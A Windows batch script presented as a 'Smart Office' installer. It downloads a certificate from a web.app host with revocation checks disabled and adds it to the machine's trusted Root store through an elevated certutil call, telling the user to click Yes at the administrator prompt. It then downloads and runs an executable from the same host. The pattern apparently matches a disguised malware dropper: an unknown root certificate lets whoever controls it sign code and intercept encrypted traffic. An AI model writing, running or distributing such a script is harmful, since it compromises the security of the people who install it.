@echo off
setlocal
title Smart Office Install

set "WORKDIR=%TEMP%\smart-office-install"
if not exist "%WORKDIR%" mkdir "%WORKDIR%"

echo [1/3] Downloading certificate...
curl -fsSL --ssl-no-revoke "https://smart-school-updates.web.app/smart-office-codesign.cer" -o "%WORKDIR%\cert.cer"
if errorlevel 1 (
  echo Download failed. Check your network connection and try again.
  pause
  exit /b 1
)

echo [2/3] Registering certificate... An administrator confirmation window will appear - click Yes.
powershell -NoProfile -Command "Start-Process certutil.exe -ArgumentList '-f','-addstore','Root',(Join-Path $env:TEMP 'smart-office-install\cert.cer') -Verb RunAs -Wait"

echo [3/3] Downloading installer...
curl -fsSL --ssl-no-revoke "https://smart-school-updates.web.app/smart-office-setup-latest.exe" -o "%WORKDIR%\setup.exe"
if errorlevel 1 (
  echo Download failed. Check your network connection and try again.
  pause
  exit /b 1
)

echo Starting installer - follow the wizard to finish.
"%WORKDIR%\setup.exe"

echo.
echo Done. You can close this window.
pause
